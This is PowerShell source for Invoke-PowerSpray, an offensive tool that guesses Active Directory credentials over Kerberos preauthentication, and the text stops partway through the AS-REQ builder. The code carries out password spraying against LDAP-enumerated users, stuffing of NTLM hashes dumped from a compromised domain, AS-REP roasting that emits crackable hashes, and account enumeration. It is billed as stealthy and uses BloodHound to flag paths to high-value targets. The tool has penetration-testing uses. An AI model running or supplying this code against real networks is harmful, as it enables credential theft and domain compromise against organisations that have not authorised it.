function Invoke-PowerSpray {
<#
.SYNOPSIS
    Guess Active Directory credentials via Kerberos preauthentication.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
    Invoke-PowerSpray checks usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
    Spraying attack can be performed against all the domain users retrieved from LDAP directory, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
    Stuffing attack can be performed using NTLM password hashes dumped from a compromised domain against another target domain in order to identify credential reuse.
    Since failing Kerberos preauthentication does not trigger traditional logon failure event, it is a stealthy way to credential guessing.
    It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-BadPwdCountScanner (by @rindert-fox) for the LDAP part.

.PARAMETER Username
    Specifies the identifier of an account to send the AS-REQ for.

.PARAMETER UserFile
    Specifies a file containing a list of usernames to send the AS-REQ for.

.PARAMETER Password
    Specifies the password for authentication attempts.

.PARAMETER Hash
    Specifies the NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER DumpFile
    Specifies a dump file containing NTLM password hashes in the format <domain>\<username>:<uid>:<LM-hash>:<NT-hash>:<comment>:<homedir>: (e.g secretsdump's output).

.PARAMETER Domain
    Specifies the domain to build the AS-REQ for.

.PARAMETER Server
    Specifies a specific domain controller to send the AS-REQ to.

.PARAMETER Ldap
    Enables domain account enumeration via LDAP.

.PARAMETER LdapUser
    Specifies the username to use for LDAP bind.

.PARAMETER LdapPass
    Specifies the password to use for LDAP bind.

.PARAMETER NoOldPwd
    Disables old password discovery to reduce the number of LDAP queries.

.PARAMETER LockoutThreshold
    Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.

.PARAMETER Delay
    Specifies the delay (in seconds) between authentication attempts, defaults to 0.

.PARAMETER Jitter
    Specifies the jitter (0-1.0) to any specified delay, defaults to +/- 0.3.

.PARAMETER Threads
    Specifies the number of threads to use for authentication attempts, defaults to 2.

.PARAMETER BloodHound
    Enables Bloodhound integration to identify path to high value targets.

.PARAMETER Credential
    Specifies credentials for BloodHound's Neo4j database.

.PARAMETER Neo4jHost
    Specifies Neo4j server address.

.PARAMETER Neo4jPort
    Specifies Neo4j server port.

.EXAMPLE
    PS C:\> Invoke-PowerSpray -UserFile .\users.lst -Server 192.168.1.10

.EXAMPLE
    PS C:\> Invoke-PowerSpray -Ldap -Domain ADATUM.CORP -LdapUser simpleuser -LdapPass 'P@ssw0rd'

.EXAMPLE
    PS C:\> Invoke-PowerSpray -Ldap -Domain ADATUM.CORP -Password 'Welcome2020' -BloodHound

.EXAMPLE
    PS C:\> Invoke-PowerSpray -UserName testuser -Domain ADATUM.CORP -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
    PS C:\> Invoke-PowerSpray -DumpFile .\contoso.ntds -Domain ADATUM.CORP -Threads 5
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Username,

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $UserFile,

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $DumpFile,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [Switch]
        $Ldap,

        [String]
        $LdapUser,

        [String]
        $LdapPass,

        [Switch]
        $NoOldPwd,

        [Int]
        $LockoutThreshold = 2,

        [String]
        $Password,

        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
        [String]
        $Hash,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = 0.3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 2,

        [Switch]
        $BloodHound,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = (New-Object System.Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Neo4jHost = '127.0.0.1',

        [ValidateNotNullOrEmpty()]
        [Int]
        $Neo4jPort = 7474
    )

    if (-not ($Domain -or $Server)) {
        # Specify current domain by default
        try {
            $Domain = $Env:USERDNSDOMAIN
        }
        catch {
            Write-Error "Running on a non-domain joined machine, please specify Domain or Server parameter" -ErrorAction Stop
        }
    }

    if ($Server) {
        # Check if the Server parameter is an IP address
        try {
            [System.Net.IPAddress]::Parse($Server) | Out-Null
        }
        catch {
            $Server = (Resolve-DnsName -Name $Server -Verbose:$false).IPAddress | Select-Object -First 1
        }
    }
    else {
        # Specify domain controller with PDC role by default, to avoid replication issues with badPwdCount
        $Server = (Resolve-DnsName -Server $Domain -Name "_ldap._tcp.pdc._msdcs.$Domain" -Type SRV -Verbose:$false).IPAddress | Select-Object -First 1
    }

    if ($Domain) {
        $rootDN = "DC=$Domain" -replace '\.',',DC='
    }
    else {
        $searchString = "LDAP://$Server/RootDSE"
        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
        $rootDN = $domainObject.rootDomainNamingContext[0]
        $Domain = $rootDN -replace 'DC=' -replace ',','.'
    }

    $ADSpath = "LDAP://$Server/$rootDN"
    $badPwdCount = -1
    if($Hash -like "*:*") {
        $Hash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
    }
    $credentials = New-Object System.Collections.ArrayList

    if ($Username) {
        if ($Ldap) {
            $filter = "(samAccountName=$Username)"
            $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
            if ($badPwdCount -eq $null) {
                Write-Error "$($username)@$($Domain) does not exist" -ErrorAction Stop
            }
        }
        if ($badPwdCount -ne $null -or -not $Ldap) {
            $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
            $credentials.add($cred) | Out-Null
        }
    }
    elseif ($UserFile) {
        $UserFilePath = Resolve-Path -Path $UserFile
        ForEach ($username in Get-Content $UserFilePath) {
            if ($Ldap) {
                $filter = "(samAccountName=$username)"
                $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                if ($badPwdCount -eq $null) {
                    Write-Verbose "$($username)@$($Domain) does not exist"
                }
            }
            if ($badPwdCount -ne $null -or -not $Ldap) {
                $cred = @{Username = $username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
                $credentials.add($cred) | Out-Null
            }
        }
    }
    elseif ($DumpFile) {
        $DumpFilePath = Resolve-Path -Path $DumpFile
        ForEach ($line in Get-Content $DumpFilePath) {
            $dump = $line.Split(':')
            $user = $dump[0]
            if ($user) {
                if ($user.Contains('\')) {
                    $username = $user.split('\')[1]
                }
                if ($Ldap) {
                    $filter = "(samAccountName=$username)"
                    $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                    if ($badPwdCount -eq $null) {
                        Write-Verbose "$($username)@$($Domain) does not exist"
                    }
                }
                if ($badPwdCount -ne $null -or -not $Ldap) {
                    $nthash = $dump[3]
                    $cred = @{Username = $username; Password = $null; Hash = $nthash; BadPwdCount = $badPwdCount}
                    $credentials.add($cred) | Out-Null
                }
            }
        }
    }
    elseif ($Ldap) {
        $filter = ''
        $disabledUserAccountControl = 2,514,546,66050,66082,262658,262690,328194,328226
        foreach($userAccountControl in $disabledUserAccountControl) {
            $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
        }
        if (-not ($Password -or $Hash)) {
            # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
            $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
        }
        else {
            # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
            $filter = "(&(samAccountType=805306368)(!badPwdCount>=$LockoutThreshold)$filter)"
            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
        }
        ForEach ($user in $users) {
            $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
            $credentials.add($cred) | Out-Null
        }
    }
    else {
        Write-Error "Either UserName, UserFile, DumpFile or Ldap parameter must be specified" -ErrorAction Stop
    }

    $params = @{
        Domain = $Domain
        Server = $Server
        ADSpath = $ADSpath
        Delay = $Delay
        Jitter = $Jitter
        Ldap = $Ldap
        LdapUser = $LdapUser
        LdapPass = $LdapPass
        NoOldPwd = $NoOldPwd
        LockoutThreshold = $LockoutThreshold
        BloodHound = $BloodHound
        Credential = $Credential
        Neo4jHost = $Neo4jHost
        Neo4jPort = $Neo4jPort
        Verbose = $VerbosePreference
    }
    if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1) {
        New-KerberosSpray @params -Collection $credentials
    }
    elseif ($credentials) {
        New-ThreadedFunction -ScriptBlock ${function:New-KerberosSpray} -ScriptParameters $params -Collection $credentials.ToArray() -Threads $Threads
    }
}

function Local:New-KerberosSpray {
    [CmdletBinding()]
    Param (
        [System.Collections.ArrayList]
        $Collection,

        [String]
        $Domain,

        [String]
        $Server,

        [UInt32]
        $Delay,

        [Double]
        $Jitter,

        [Switch]
        $Ldap,

        [String]
        $LdapUser,

        [String]
        $LdapPass,

        [Switch]
        $NoOldPwd,

        [Int]
        $LockoutThreshold,

        [String]
        $ADSpath,

        [Switch]
        $BloodHound,

        [System.Management.Automation.PSCredential]
        $Credential,

        [String]
        $Neo4jHost,

        [Int]
        $Neo4jPort
    )

    ForEach ($cred in $Collection) {
        if ($cred.Password -or $cred.Hash -and $cred.badPwdCount -ge $LockoutThreshold) {
            Write-Host "[!] Skipping $($cred.Username)@$Domain because its 'badPwdCount' is $($cred.badPwdCount) (> $LockoutThreshold)"
            continue
        }
        elseif ($cred.Password) {
            # Kerberos preauthentication using plain-text password (spraying)
            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -EncType 18 -Domain $Domain -Server $Server
        }
        elseif ($cred.Hash) {
            # Kerberos preauthentication using NTLM hash / RC4 key (stuffing)
            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Hash $cred.Hash -Domain $Domain -Server $Server
        }
        elseif ($Ldap) {
            # Kerberos preauthentication without credentials (roasting)
            # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 23 -Domain $Domain -Server $Server
        }
        else {
            # Kerberos preauthentication without credentials (enumeration)
            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 18 -Domain $Domain -Server $Server
        }
        $tag = $asn_AS_REP.TagValue

        # ERR_PREAUTH_REQUIRED
        if ($tag -eq 30) {
            $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
            $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())

            switch ($error_code) {
                # KDC_ERR_C_PRINCIPAL_UNKNOWN
                6 {
                    Write-Verbose "$($cred.Username)@$($Domain) does not exist" 
                }
                # KDC_ERR_ETYPE_NOSUPP
                14 {
                    Write-Warning "$($cred.Username)@$($Domain) preauthentication failed because KDC has no support for encryption type"
                }
                # KDC_ERR_CLIENT_REVOKED
                18 {
                    Write-Host "[-] $($cred.Username)@$($Domain) account disabled or locked out"
                }
                # KDC_ERR_KEY_EXPIRED
                23 {
                    if ($BloodHound) {
                        $pathNb = 0
                        $bhPath = $null
                        $query = "
                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                        RETURN COUNT(p) AS pathNb
                        "
                        try {
                            $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                            $pathNb = $result.data[0] | Where-Object {$_}
                            if ($pathNb -gt 0) {
                                $bhPath = '[PATH TO HIGH VALUE TARGETS]'
                            }
                        }
                        catch {
                            Write-Warning $Error[0].ErrorDetails.Message
                        }
                    }
                    Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate [expired password] $bhPath"
                }
                # KDC_ERR_PREAUTH_FAILED
                24 {
                    $output = "$($cred.Username)@$($Domain) failed to authenticate"
                    $newBadPwdCount = $null
                    if ($Ldap -And -Not $NoOldPwd) {
                        $filter = "(samAccountName=$($cred.Username))"
                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                    }
                    if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                            Write-Host "[?] $output [old password]"
                    }
                    else {
                        Write-Verbose "$output"
                    }
                }
                # KDC_ERR_PREAUTH_REQUIRED
                25 {
                    $output = "$($cred.Username)@$($Domain) exists"
                    if ($Ldap) {
                        Write-Verbose $output
                    }
                    else {
                        Write-Host "[+] $output"
                    }
                }
                # KRB_AP_ERR_SKEW
                37 {
                    if ($BloodHound) {
                        $pathNb = 0
                        $bhPath = $null
                        $query = "
                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                        RETURN COUNT(p) AS pathNb
                        "
                        try {
                            $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                            $pathNb = $result.data[0] | Where-Object {$_}
                            if ($pathNb -gt 0) {
                                $bhPath = '[PATH TO HIGH VALUE TARGETS]'
                            }
                        }
                        catch {
                            Write-Warning $Error[0].ErrorDetails.Message
                        }
                    }
                    Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! $bhPath"
                }
                # KDC_ERR_WRONG_REALM
                68 {
                    Write-Error "Invalid Kerberos REALM: $Domain" -ErrorAction Stop
                }
                # https://tools.ietf.org/html/rfc1510#section-8.3
                default {
                    Write-Warning "Unknown error code for '$($cred.Username)@$($Domain): $error_code"
                }
            }
        }
        # AS-REP
        elseif ($tag -eq 11) {
            if (-not ($cred.Password -or $cred.Hash)) {
                Write-Host "[+] $($cred.Username)@$($Domain) does not require Kerberos preauthentication!"
                $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
                $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
                $cipher = $temp.Sub[0].GetOctetString()
                $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
                $asrepHash = $repHash.Insert(32, '$')
                $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 0}
                $eType = $temp.Sub[0].GetInteger()
                Write-Output "`$krb5asrep`$$($eType)`$$($cred.Username)@$($Domain):$($asrepHash)"
            }
            else {
                if ($BloodHound) {
                    $pathNb = 0
                    $bhPath = $null
                    $query = "
                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                    RETURN COUNT(p) AS pathNb
                    "
                    try {
                        $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                        $pathNb = $result.data[0] | Where-Object {$_}
                        if ($pathNb -gt 0) {
                            $bhPath = '[PATH TO HIGH VALUE TARGETS]'
                        }
                    }
                    catch {
                        Write-Warning $Error[0].ErrorDetails.Message
                    }
                }
                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! $bhPath"
            }
        }
        else {
            Write-Warning "Unknown tag number for '$($cred.Username)@$($Domain): $tag'"
        }

        $randNb = New-Object System.Random
        $waitingTime = $randNb.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        Start-Sleep -Seconds $waitingTime
    }
}

function Local:New-KerbPreauth {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('User')]
        [String]
        $Username,

        [Parameter(Mandatory = $False)]
        [String]
        $Password,

        [Parameter(Mandatory = $False)]
        [ValidateScript({$_.Length -eq 32})]
        [String]
        $Hash,

        [Parameter(Mandatory = $False)]
        [ValidateSet(1, 3, 17, 18, 23, 24)]
        [Int]
        $EncType = 18,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Server
    )

    $Address = [System.Net.IPAddress]::Parse($Server)
    $EndPoint = New-Object System.Net.IPEndPoint $Address, 88
    $Socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::TCP)
    $Socket.TTL = 128

    if ($Password) {
        $salt = "$($Domain.ToUpper())$($Username)"
        $keyBytes = KerberosPasswordHash -eType $EncType -Password $Password -Salt $salt -Count 4096
        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $keyBytes
    }
    elseif ($Hash) {
        # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
        $ntlmHashBytes = [byte[]] ($Hash -replace '..', '0x$&,' -split ',' -ne '')
        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 23 -Key $ntlmHashBytes
    }
    else {
        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType
    }

    $LengthBytes = [System.BitConverter]::GetBytes($ASREQ.Length)
    [Array]::Reverse($LengthBytes)
    $totalRequestBytes  = $LengthBytes + $ASREQ

    try {
        $Socket.Connect($EndPoint)
        $BytesSent = $Socket.Send($totalRequestBytes)

        $ResponseBuffer = New-Object System.Byte[] 65536
        $BytesReceived = $Socket.Receive($ResponseBuffer)
    }
    catch {
        throw "Error sending AS-REQ to '$TargetDCIP' : $_"
    }
    $ResponseData = $ResponseBuffer[4..$($BytesReceived-1)]
    return [Asn1.AsnElt]::Decode($ResponseData, $false)
}

function Local:New-ASReq {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('User')]
        [String]
        $Username,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [UInt32]
        $EncType,

        [Parameter(Mandatory = $False)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Key
    )

    # pvno            [1] INTEGER (5) = Kerberos protocol version number for windows
    $pvnoAsn = [Asn1.AsnElt]::MakeInteger(5)
    $pvnoSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($pvnoAsn))
    $pvno = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $pvnoSeq)

    # msg-type        [2] INTEGER (10 -- AS -- ) = KRB-AS-REQ
    $msg_type_ASN = [Asn1.AsnElt]::MakeInteger(10)
    $msg_type_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($msg_type_ASN))
    $msgType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $msg_type_ASNSeq)

    # PA-DATA
    $padatas = @()
    if ($Key) {
        #   padata-type   [1] Int32 (2 = ENC_TIMESTAMP)
        $padataNameType = [Asn1.AsnElt]::MakeInteger(2)
        $padataNameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataNameType))
        $padataType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $padataNameTypeSeq)

        $patimestamp = [DateTime]::UtcNow
        $patimestampAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::GeneralizedTime, $patimestamp.ToString("yyyyMMddHHmmssZ"))
        $patimestampSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($patimestampAsn))
        $patimestampSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $patimestampSeq)
        $totalSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($patimestampSeq))
        $data = $totalSeq.Encode()
        # KeyUsage 1 = KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP
        $encData = KerberosEncrypt -eType $EncType -keyUsage 1 -key $Key -data $data
        # etype   [0] Int32 -- EncryptionType --
        $etypeAsn = [Asn1.AsnElt]::MakeInteger($EncType)
        $etypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
        $etypeSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $etypeSeq)
        # cipher  [2] OCTET STRING -- ciphertext
        $cipherAsn = [Asn1.AsnElt]::MakeBlob($encData);
        $cipherSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cipherAsn))
        $cipherSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $cipherSeq)
        $cipherEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeSeq, $cipherSeq))

        $blob = [Asn1.AsnElt]::MakeBlob($cipherEltSeq.Encode())
        $blobSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($blob))
        $blobSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $blobSeq)
        $padataEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataType, $blobSeq))
        $padatas += $padataEltSeq
    }

    #   padata-type   [1] Int32 (128 = PA_PAC_REQUEST)
    $padataNameType = [Asn1.AsnElt]::MakeInteger(128)
    $padataNameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataNameType))
    $padataType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $padataNameTypeSeq)
    #   padata-value  [2] OCTET STRING (encoded KRB5-PADATA-PA-PAC-REQUEST with include_pac = true)
    $include_pac = [Asn1.AsnElt]::MakeBlob(@(0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01))
    $paDataElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($include_pac))
    $paData = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $paDataElt)
    # PA-DATA         ::= SEQUENCE
    $padataEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataType, $paData))
    $padatas += $padataEltSeq
    # padata          [3] SEQUENCE OF PA-DATA OPTIONAL
    $padata_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, $padatas)
    $padata_ASNSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padata_ASNSeq))
    $padata = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 3, $padata_ASNSeq2)

    # kdc-options     [0] KDCOptions (forwardable, renewable, renewable-ok)
    $kdcOptionsAsn = [Asn1.AsnElt]::MakeBitString(@(0x40,0x80,0x00,0x10))
    $kdcOptionsSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($kdcOptionsAsn))
    $kdcOptions = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $kdcOptionsSeq)

    # cname           [1] PrincipalName OPTIONAL ::= SEQUENCE
    #   name-type     [0] Int32 (1 = KRB5-NT-PRINCIPAL)
    $cnameTypeElt = [Asn1.AsnElt]::MakeInteger(1)
    $cnameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameTypeElt))
    $cnameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $cnameTypeSeq)
    #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
    $cnameStringElt = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Username)
    $cnameStringElt = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $cnameStringElt)
    $cstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameStringElt))
    $cstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cstringSeq))
    $cnameString = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $cstringSeq2)
    # cname         ::= SEQUENCE
    $cnameSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameType, $cnameString))
    $cnameElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameSeq))
    $cname = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $cnameElt)

    # realm           [2] Realm
    $realmAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
    $realmAsn = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $realmAsn)
    $realmSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($realmAsn))
    $realm = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $realmSeq)

    # sname           [3] PrincipalName OPTIONAL ::= SEQUENCE
    #   name-type     [0] Int32 (2 = KRB5-NT-SRV-INST)
    $snameTypeElt = [Asn1.AsnElt]::MakeInteger(2)
    $snameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameTypeElt))
    $snameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $snameTypeSeq)
    #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
    $snameStringElt1 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, 'krbtgt')
    $snameStringElt1 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt1)
    $snameStringElt2 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
    $snameStringElt2 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt2)
    $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1, $snameStringElt2))
    $sstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($sstringSeq))
    $snameString = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $sstringSeq2)
    # sname         ::= SEQUENCE
    $snameSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameType, $snameString))
    $snameElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameSeq))
    $sname = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 3, $snameElt)

    # till            [5] KerberosTime
    $tillDate = [DateTime]::ParseExact("20370913024805Z", "yyyyMMddHHmmssZ", [System.Globalization.CultureInfo]::InvariantCulture)
    $tillAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::GeneralizedTime, $tillDate.ToString("yyyyMMddHHmmssZ"))
    $tillSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($tillAsn))
    $till = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 5, $tillSeq)

    # nonce           [7] UInt32
    $nonceAsn = [Asn1.AsnElt]::MakeInteger(1818848256)
    $nonceSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($nonceAsn))
    $nonce = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 7, $nonceSeq)

    # etype           [8] SEQUENCE OF Int32 -- EncryptionType -- in preference order --
    $etypeAsn = [Asn1.AsnElt]::MakeInteger($EncType)
    $etypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
    $etypeSeqTotal1 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
    $etypeSeqTotal2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, $etypeSeqTotal1)
    $etype = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 8, $etypeSeqTotal2)

    # req-body        [4] KDC-REQ-BODY
    $req_Body_ASN = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($kdcOptions, $cname, $realm, $sname, $till, $nonce, $etype))
    $req_Body_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($req_Body_ASN))
    $reqBodySeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 4, $req_Body_ASNSeq)

    # final AS-REQ ASN.1 structure
    $asReqSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($pvno, $msgType, $padata, $reqBodySeq))

    # AS-REQ              [APPLICATION 10] = KDC-REQ
